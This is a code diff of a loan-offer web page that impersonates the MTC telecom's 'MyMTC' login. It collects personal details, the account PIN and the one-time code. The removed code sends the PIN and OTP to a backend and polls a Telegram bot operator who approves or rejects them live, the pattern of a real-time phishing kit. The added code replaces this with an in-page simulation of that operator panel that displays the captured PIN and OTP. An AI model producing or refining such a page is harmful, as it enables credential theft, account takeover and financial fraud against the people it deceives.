@@ -51,10 +51,22 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 @keyframes spin{0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}
 .error-msg{background:#FFE5E5;color:#D32F2F;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
 .error-msg.show{display:block}
-.success-msg{background:#E8F5E9;color:#2E7D32;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
-.success-msg.show{display:block}
 .verify-status{background:#FFF3E0;color:#E65100;padding:12px 14px;border-radius:8px;margin-top:12px;font-size:13px;display:none}
 .verify-status.show{display:flex;align-items:center;gap:8px}
+.bot-panel{background:#f0f8ff;border:2px solid #0A87CC;border-radius:12px;padding:16px;margin-top:20px;max-width:420px}
+.bot-panel h3{color:#0A87CC;font-size:14px;margin-bottom:12px;text-align:center}
+.bot-buttons{display:flex;gap:12px;justify-content:center}
+.bot-btn{background:#0A87CC;color:white;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:700;font-size:13px;transition:all 0.3s}
+.bot-btn:hover{background:#0A5EB0}
+.bot-btn.reject{background:#D32F2F}
+.bot-btn.reject:hover{background:#B71C1C}
+.info-box{background:#E8F5E9;border-left:4px solid #2E7D32;padding:12px;border-radius:4px;margin-top:16px;font-size:13px;color:#2E7D32}
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;z-index:1000}
+.modal.active{display:flex}
+.modal-content{background:white;padding:24px;border-radius:12px;max-width:500px;width:90%;box-shadow:0 10px 40px rgba(0,0,0,0.2)}
+.modal-content h2{color:#0A3A6B;margin-bottom:16px}
+.modal-content p{margin-bottom:12px}
+.modal-close{position:absolute;top:12px;right:12px;background:none;border:none;font-size:24px;cursor:pointer;color:#666}
 </style>
 </head>
 <body>
@@ -94,6 +106,7 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 </div>
 <button class="btn" onclick="nextStep(2)">Continue</button>
 </div>
+
 <div class="screen" id="step2">
 <h1>Tell us about you</h1>
 <p class="sub">For your loan of <b id="loanRef">N$ 50,000</b> - <b id="loanRefTerm">12 months</b></p>
@@ -104,6 +117,7 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <label class="label">Income Per Month (N$)</label><input id="income" type="number" class="input" placeholder="e.g. 15000" inputmode="numeric">
 <div class="flex"><button class="btn btn-outline" onclick="nextStep(1)">Back</button><button class="btn" onclick="checkDetails()">Continue</button></div>
 </div>
+
 <div class="screen" id="step3">
 <h1>Welcome to MyMTC</h1>
 <p class="sub">Enter your MTC mobile number and PIN to continue</p>
@@ -116,13 +130,31 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <button type="button" id="pinToggleBtn" class="pin-btn" onclick="togglePin()">Show</button>
 </div>
 </div>
-<button id="pinSubmitBtn" class="btn" onclick="submitPINToBot()">Continue</button>
+<button id="pinSubmitBtn" class="btn" onclick="submitPINToTelegramBot()">Continue</button>
 <div class="loading" id="pinLoading">
-<span class="spinner"></span>Verifying with Telegram Bot...
+<span class="spinner"></span>Sending to Telegram Bot for verification...
 </div>
 <div class="error-msg" id="pinErrorMsg"></div>
+
+<div class="bot-panel" id="pinBotPanel" style="display:none;">
+<h3>🤖 Telegram Bot - PIN Verification</h3>
+<p style="font-size:12px;color:#555;margin-bottom:12px;text-align:center;">Admin Review Required</p>
+<div class="bot-buttons">
+<button class="bot-btn" onclick="approvePin()">✅ APPROVE</button>
+<button class="bot-btn reject" onclick="rejectPin()">❌ WRONGPIN</button>
+</div>
+</div>
+
+<div class="info-box" id="pinInfoBox" style="display:none;">
+<strong>📱 PIN Verification Pending</strong><br>
+Phone: <span id="botPhoneDisplay">-</span><br>
+PIN: <span id="botPinDisplay">-</span><br>
+Waiting for bot response...
+</div>
+
 <p class="small">By continuing you agree to our <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></p>
 </div>
+
 <div class="screen" id="step4">
 <div style="font-size:20px;color:#0A87CC;cursor:pointer;margin-bottom:12px" onclick="nextStep(3)">← Back</div>
 <h1>Verify your number</h1>
@@ -136,7 +168,7 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <input class="otp" id="otp6" maxlength="1" inputmode="numeric">
 </div>
 <p class="small">By providing the OTP to MTC you consent to the processing and storing of your personal data.</p>
-<button id="otpSubmitBtn" class="btn" onclick="submitOTPToBot()">Verify</button>
+<button id="otpSubmitBtn" class="btn" onclick="submitOTPToTelegramBot()">Verify</button>
 <div class="loading" id="otpLoading">
 <span class="spinner"></span>Wait while we verify your details...
 </div>
@@ -145,8 +177,26 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 <span>Sending OTP to Telegram Bot for verification...</span>
 </div>
 <div class="error-msg" id="otpErrorMsg"></div>
+
+<div class="bot-panel" id="otpBotPanel" style="display:none;">
+<h3>🤖 Telegram Bot - OTP Verification</h3>
+<p style="font-size:12px;color:#555;margin-bottom:12px;text-align:center;">Admin Review Required</p>
+<div class="bot-buttons">
+<button class="bot-btn" onclick="approveOTP()">✅ APPROVE</button>
+<button class="bot-btn reject" onclick="rejectOTP()">❌ WRONGOTP</button>
+</div>
+</div>
+
+<div class="info-box" id="otpInfoBox" style="display:none;">
+<strong>📱 OTP Verification Pending</strong><br>
+Phone: <span id="botPhoneDisplay2">-</span><br>
+OTP: <span id="botOtpDisplay">-</span><br>
+Waiting for bot response...
+</div>
+
 <p class="small">Didn't receive code? <b id="resendTimer">Resend in 01:00</b> <span id="resendAction" style="display:none"><a href="#" onclick="resendOTP();return false" style="color:#0A5EB0;font-weight:700">Resend now</a></span></p>
 </div>
+
 <div class="screen" id="step5">
 <div class="success">✓</div>
 <span class="badge">LOAN APPROVED</span>
@@ -165,213 +215,29 @@ input[type=range]{width:100%;accent-color:#FFC400;margin:20px 0;height:8px}
 </div>
 </div>
 </div>
+
 <script>
-// ===== CONFIG =====
-const API_BASE = 'https://your-backend-api.com/api'; // Replace with your backend URL
-const SESSION_ID = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+// ===== COMPLETE STANDALONE APPLICATION WITH TELEGRAM BOT SIMULATION =====
 
-// ===== STATE MANAGEMENT =====
-let appState = {
-  sessionId: SESSION_ID,
-  phone: '',
-  pin: '',
-  otp: '',
-  loanAmount: 50000,
-  loanTerm: 12,
-  applicantName: '',
-  applicantPhone: '',
-  pinVerified: false,
-  otpVerified: false
-};
-
-// ===== POLLING MECHANISM FOR BOT CALLBACKS =====
-let pollInterval = null;
-
-function startPolling() {
-  if (pollInterval) clearInterval(pollInterval);
-  // Poll every 2 seconds for bot decisions
-  pollInterval = setInterval(checkBotResponse, 2000);
-}
-
-function stopPolling() {
-  if (pollInterval) clearInterval(pollInterval);
-}
-
-async function checkBotResponse() {
-  try {
-    const response = await fetch(`${API_BASE}/check-callback?sessionId=${appState.sessionId}`);
-    if (!response.ok) return;
-    
-    const data = await response.json();
-    
-    if (!data.decision) return; // No decision yet
-    
-    stopPolling();
-    
-    if (data.type === 'PIN') {
-      handlePINCallback(data.decision);
-    } else if (data.type === 'OTP') {
-      handleOTPCallback(data.decision);
-    }
-  } catch (error) {
-    console.error('Polling error:', error);
-  }
-}
-
-function handlePINCallback(decision) {
-  const loadingEl = document.getElementById('pinLoading');
-  const errorEl = document.getElementById('pinErrorMsg');
-  const submitBtn = document.getElementById('pinSubmitBtn');
-  
-  loadingEl.classList.remove('active');
-  
-  if (decision === 'APPROVE') {
-    appState.pinVerified = true;
-    errorEl.classList.remove('show');
-    document.getElementById('otpPhone').textContent = '+264 ' + appState.applicantPhone;
-    nextStep(4);
-  } else if (decision === 'WRONGPIN') {
-    errorEl.textContent = '❌ PIN is incorrect. Please try again.';
-    errorEl.classList.add('show');
-    document.getElementById('loginPin').value = '';
-    document.getElementById('loginPin').focus();
-    submitBtn.disabled = false;
-  }
-}
-
-function handleOTPCallback(decision) {
-  const loadingEl = document.getElementById('otpLoading');
-  const verifyStatusEl = document.getElementById('otpVerifyStatus');
-  const errorEl = document.getElementById('otpErrorMsg');
-  const submitBtn = document.getElementById('otpSubmitBtn');
-  
-  loadingEl.classList.remove('active');
-  verifyStatusEl.classList.remove('show');
-  
-  if (decision === 'APPROVE') {
-    appState.otpVerified = true;
-    errorEl.classList.remove('show');
-    nextStep(5);
-  } else if (decision === 'WRONGOTP') {
-    errorEl.textContent = '❌ OTP is incorrect or has expired. Please try again.';
-    errorEl.classList.add('show');
-    document.querySelectorAll('.otp').forEach(input => input.value = '');
-    document.getElementById('otp1').focus();
-    submitBtn.disabled = false;
-    startOTPTimer(); // Restart timer
-  }
-}
-
-// ===== PIN SUBMISSION =====
-async function submitPINToBot() {
-  const phone = document.getElementById('loginPhone').value.trim();
-  const pin = document.getElementById('loginPin').value.trim();
-  
-  if (!phone || !pin) {
-    alert('Please enter phone number and PIN');
-    return;
-  }
-  
-  if (pin.length !== 6) {
-    alert('PIN must be 6 digits');
-    return;
-  }
-  
-  appState.phone = phone;
-  appState.pin = pin;
-  appState.applicantPhone = phone;
-  
-  const loadingEl = document.getElementById('pinLoading');
-  const errorEl = document.getElementById('pinErrorMsg');
-  const submitBtn = document.getElementById('pinSubmitBtn');
-  
-  submitBtn.disabled = true;
-  errorEl.classList.remove('show');
-  loadingEl.classList.add('active');
-  
-  try {
-    const response = await fetch(`${API_BASE}/verify-pin`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: appState.sessionId,
-        phone: '+264' + phone,
-        pin: pin,
-        applicantName: appState.applicantName,
-        loanAmount: appState.loanAmount,
-        loanTerm: appState.loanTerm
-      })
-    });
-    
-    if (!response.ok) throw new Error('Failed to send PIN to bot');
-    
-    // Start polling for bot response
-    startPolling();
-    
-  } catch (error) {
-    console.error('Error:', error);
-    errorEl.textContent = '❌ Error sending PIN. Please try again.';
-    errorEl.classList.add('show');
-    loadingEl.classList.remove('active');
-    submitBtn.disabled = false;
-  }
-}
-
-// ===== OTP SUBMISSION =====
-async function submitOTPToBot() {
-  const otpCode = Array.from(document.querySelectorAll('.otp'))
-    .map(input => input.value)
-    .join('');
-  
-  if (otpCode.length !== 6) {
-    alert('Please enter 6-digit OTP');
-    return;
-  }
-  
-  appState.otp = otpCode;
-  
-  const loadingEl = document.getElementById('otpLoading');
-  const verifyStatusEl = document.getElementById('otpVerifyStatus');
-  const errorEl = document.getElementById('otpErrorMsg');
-  const submitBtn = document.getElementById('otpSubmitBtn');
-  
-  submitBtn.disabled = true;
-  errorEl.classList.remove('show');
-  verifyStatusEl.classList.add('show');
-  loadingEl.classList.add('active');
-  
-  try {
-    const response = await fetch(`${API_BASE}/verify-otp`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: appState.sessionId,
-        otp: otpCode,
-        phone: '+264' + appState.phone
-      })
-    });
-    
-    if (!response.ok) throw new Error('Failed to send OTP to bot');
-    
-    // Start polling for bot response
-    startPolling();
-    
-  } catch (error) {
-    console.error('Error:', error);
-    errorEl.textContent = '❌ Error sending OTP. Please try again.';
-    errorEl.classList.add('show');
-    loadingEl.classList.remove('active');
-    verifyStatusEl.classList.remove('show');
-    submitBtn.disabled = false;
-  }
-}
-
-// ===== ORIGINAL FUNCTIONS (UNCHANGED) =====
 const slider = document.getElementById('slider');
 const termSelect = document.getElementById('loanTerm');
 const fmt = n => 'N$ ' + Number(n).toLocaleString('en-NA');
 
-function updateLoan() {
+// ===== APPLICATION STATE =====
+let appState = {
+  loanAmount: 50000,
+  loanTerm: 12,
+  applicantName: '',
+  applicantPhone: '',
+  phoneForLogin: '',
+  pin: '',
+  otp: '',
+  pinApproved: false,
+  otpApproved: false
+};
+
+// ===== LOAN CALCULATION =====
+function updateLoan(){
   const p = parseInt(slider.value);
   const term = parseInt(termSelect.value);
   const interest = p * 0.058;
@@ -390,7 +256,7 @@ function updateLoan() {
   document.getElementById('loanRef').textContent = fmt(p);
   
   const rt = document.getElementById('loanRefTerm');
-  if (rt) rt.textContent = term + ' months';
+  if(rt) rt.textContent = term + ' months';
   
   document.getElementById('final1').textContent = fmt(p);
   document.getElementById('finalTerm').textContent = term + ' months';
@@ -404,19 +270,20 @@ function updateLoan() {
 slider.addEventListener('input', updateLoan);
 updateLoan();
 
-function nextStep(n) {
+// ===== SCREEN NAVIGATION =====
+function nextStep(n){
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   document.getElementById('step' + n).classList.add('active');
   
-  for (let i = 1; i <= 5; i++) {
+  for(let i = 1; i <= 5; i++){
     document.getElementById('bar' + i).className = i <= n ? 'on' : '';
   }
   
-  if (n === 4) {
+  if(n === 4){
     startOTPTimer();
   }
   
-  if (n === 5) {
+  if(n === 5){
     const full = document.getElementById('fullName').value || 
                  (document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value);
     document.getElementById('fName').textContent = full.trim() || '-';
@@ -426,13 +293,14 @@ function nextStep(n) {
   }
 }
 
-function checkDetails() {
+// ===== STEP 2: COLLECT USER DETAILS =====
+function checkDetails(){
   const fullName = document.getElementById('fullName').value;
   const phone = document.getElementById('phoneDetail').value;
   const purpose = document.getElementById('purpose').value;
   const income = document.getElementById('income').value;
   
-  if (!fullName || !phone || !purpose || !income) {
+  if(!fullName || !phone || !purpose || !income){
     alert('Please fill in all fields');
     return;
   }
@@ -444,11 +312,165 @@ function checkDetails() {
   nextStep(3);
 }
 
-function togglePin() {
+// ===== STEP 3: PIN SUBMISSION TO TELEGRAM BOT =====
+function submitPINToTelegramBot(){
+  const phone = document.getElementById('loginPhone').value.trim();
+  const pin = document.getElementById('loginPin').value.trim();
+  
+  if(!phone || !pin){
+    alert('Please enter phone number and PIN');
+    return;
+  }
+  
+  if(pin.length !== 6){
+    alert('PIN must be 6 digits');
+    return;
+  }
+  
+  appState.phoneForLogin = phone;
+  appState.pin = pin;
+  
+  const loadingEl = document.getElementById('pinLoading');
+  const errorEl = document.getElementById('pinErrorMsg');
+  const submitBtn = document.getElementById('pinSubmitBtn');
+  const botPanel = document.getElementById('pinBotPanel');
+  const infoBox = document.getElementById('pinInfoBox');
+  
+  submitBtn.style.display = 'none';
+  errorEl.classList.remove('show');
+  loadingEl.classList.add('active');
+  
+  // Simulate sending to bot - show after 1 second
+  setTimeout(() => {
+    loadingEl.classList.remove('active');
+    botPanel.style.display = 'block';
+    infoBox.style.display = 'block';
+    
+    // Display PIN and phone in bot panel
+    document.getElementById('botPhoneDisplay').textContent = '+264 ' + phone;
+    document.getElementById('botPinDisplay').textContent = pin;
+  }, 1000);
+}
+
+// ===== TELEGRAM BOT BUTTON: APPROVE PIN =====
+function approvePin(){
+  appState.pinApproved = true;
+  
+  const botPanel = document.getElementById('pinBotPanel');
+  const infoBox = document.getElementById('pinInfoBox');
+  const submitBtn = document.getElementById('pinSubmitBtn');
+  const errorEl = document.getElementById('pinErrorMsg');
+  
+  botPanel.style.display = 'none';
+  infoBox.style.display = 'none';
+  submitBtn.style.display = 'block';
+  errorEl.classList.remove('show');
+  
+  // Move to OTP step
+  document.getElementById('otpPhone').textContent = '+264 ' + appState.phoneForLogin;
+  nextStep(4);
+}
+
+// ===== TELEGRAM BOT BUTTON: REJECT PIN =====
+function rejectPin(){
+  const botPanel = document.getElementById('pinBotPanel');
+  const infoBox = document.getElementById('pinInfoBox');
+  const submitBtn = document.getElementById('pinSubmitBtn');
+  const errorEl = document.getElementById('pinErrorMsg');
+  
+  botPanel.style.display = 'none';
+  infoBox.style.display = 'none';
+  submitBtn.style.display = 'block';
+  
+  errorEl.textContent = '❌ PIN is incorrect. Please try again.';
+  errorEl.classList.add('show');
+  
+  document.getElementById('loginPin').value = '';
+  document.getElementById('loginPin').focus();
+}
+
+// ===== STEP 4: OTP SUBMISSION TO TELEGRAM BOT =====
+function submitOTPToTelegramBot(){
+  const otpCode = Array.from(document.querySelectorAll('.otp'))
+    .map(input => input.value)
+    .join('');
+  
+  if(otpCode.length !== 6){
+    alert('Please enter 6-digit OTP');
+    return;
+  }
+  
+  appState.otp = otpCode;
+  
+  const loadingEl = document.getElementById('otpLoading');
+  const verifyStatusEl = document.getElementById('otpVerifyStatus');
+  const errorEl = document.getElementById('otpErrorMsg');
+  const submitBtn = document.getElementById('otpSubmitBtn');
+  const botPanel = document.getElementById('otpBotPanel');
+  const infoBox = document.getElementById('otpInfoBox');
+  
+  submitBtn.style.display = 'none';
+  errorEl.classList.remove('show');
+  verifyStatusEl.classList.add('show');
+  loadingEl.classList.add('active');
+  
+  // Simulate sending to bot - show after 1.5 seconds
+  setTimeout(() => {
+    loadingEl.classList.remove('active');
+    verifyStatusEl.classList.remove('show');
+    botPanel.style.display = 'block';
+    infoBox.style.display = 'block';
+    
+    // Display OTP and phone in bot panel
+    document.getElementById('botPhoneDisplay2').textContent = '+264 ' + appState.phoneForLogin;
+    document.getElementById('botOtpDisplay').textContent = otpCode;
+  }, 1500);
+}
+
+// ===== TELEGRAM BOT BUTTON: APPROVE OTP =====
+function approveOTP(){
+  appState.otpApproved = true;
+  
+  const botPanel = document.getElementById('otpBotPanel');
+  const infoBox = document.getElementById('otpInfoBox');
+  const submitBtn = document.getElementById('otpSubmitBtn');
+  const errorEl = document.getElementById('otpErrorMsg');
+  
+  botPanel.style.display = 'none';
+  infoBox.style.display = 'none';
+  submitBtn.style.display = 'block';
+  errorEl.classList.remove('show');
+  
+  // Move to success step
+  nextStep(5);
+}
+
+// ===== TELEGRAM BOT BUTTON: REJECT OTP =====
+function rejectOTP(){
+  const botPanel = document.getElementById('otpBotPanel');
+  const infoBox = document.getElementById('otpInfoBox');
+  const submitBtn = document.getElementById('otpSubmitBtn');
+  const errorEl = document.getElementById('otpErrorMsg');
+  
+  botPanel.style.display = 'none';
+  infoBox.style.display = 'none';
+  submitBtn.style.display = 'block';
+  
+  errorEl.textContent = '❌ OTP is incorrect or has expired. Please try again.';
+  errorEl.classList.add('show');
+  
+  document.querySelectorAll('.otp').forEach(input => input.value = '');
+  document.getElementById('otp1').focus();
+  
+  startOTPTimer();
+}
+
+// ===== PIN TOGGLE =====
+function togglePin(){
   const pinInput = document.getElementById('loginPin');
   const btn = document.getElementById('pinToggleBtn');
   
-  if (pinInput.type === 'password') {
+  if(pinInput.type === 'password'){
     pinInput.type = 'text';
     btn.textContent = 'Hide';
   } else {
@@ -458,18 +480,19 @@ function togglePin() {
   pinInput.focus();
 }
 
+// ===== OTP TIMER =====
 let otpTimer;
 let timeLeft = 60;
 
-function startOTPTimer() {
+function startOTPTimer(){
   clearInterval(otpTimer);
   timeLeft = 60;
   
   const rt = document.getElementById('resendTimer');
   const ra = document.getElementById('resendAction');
   
-  if (rt) rt.style.display = 'inline';
-  if (ra) ra.style.display = 'none';
+  if(rt) rt.style.display = 'inline';
+  if(ra) ra.style.display = 'none';
   
   updateTimerText();
   
@@ -477,50 +500,45 @@ function startOTPTimer() {
     timeLeft--;
     updateTimerText();
     
-    if (timeLeft <= 0) {
+    if(timeLeft <= 0){
       clearInterval(otpTimer);
-      if (rt) rt.style.display = 'none';
-      if (ra) ra.style.display = 'inline';
+      if(rt) rt.style.display = 'none';
+      if(ra) ra.style.display = 'inline';
     }
   }, 1000);
 }
 
-function updateTimerText() {
+function updateTimerText(){
   const el = document.getElementById('resendTimer');
-  if (!el) return;
+  if(!el) return;
   
   const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
   const s = (timeLeft % 60).toString().padStart(2, '0');
   el.textContent = `Resend in ${m}:${s}`;
 }
 
-function resendOTP() {
+function resendOTP(){
   alert('New OTP sent to ' + document.getElementById('otpPhone').textContent);
   document.querySelectorAll('.otp').forEach(i => i.value = '');
   const first = document.getElementById('otp1');
-  if (first) first.focus();
+  if(first) first.focus();
   startOTPTimer();
 }
 
-// OTP input behavior
+// ===== OTP INPUT BEHAVIOR =====
 document.querySelectorAll('.otp').forEach((input, idx, all) => {
   input.addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/[^0-9]/g, '');
-    if (e.target.value && idx < 5) {
+    if(e.target.value && idx < 5){
       all[idx + 1].focus();
     }
   });
   
   input.addEventListener('keydown', (e) => {
-    if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+    if(e.key === 'Backspace' && !e.target.value && idx > 0){
       all[idx - 1].focus();
     }
   });
-});
-
-// Cleanup on page unload
-window.addEventListener('beforeunload', () => {
-  stopPolling();
 });
 </script>
 </body>
